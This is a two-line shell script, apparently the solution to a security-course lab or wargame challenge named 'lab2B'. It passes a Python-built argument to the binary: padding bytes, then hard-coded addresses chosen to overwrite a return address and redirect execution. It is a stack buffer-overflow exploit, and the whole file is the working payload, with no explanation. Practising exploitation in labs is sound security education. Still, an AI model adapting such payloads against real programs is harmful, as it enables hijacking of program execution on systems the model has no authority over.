#!/bin/sh
./lab2B $(python -c 'print "A" * 27 + "\x90\x85\x04\x08" + "B" * 4 + "\xd0\x87\x04\x08"')
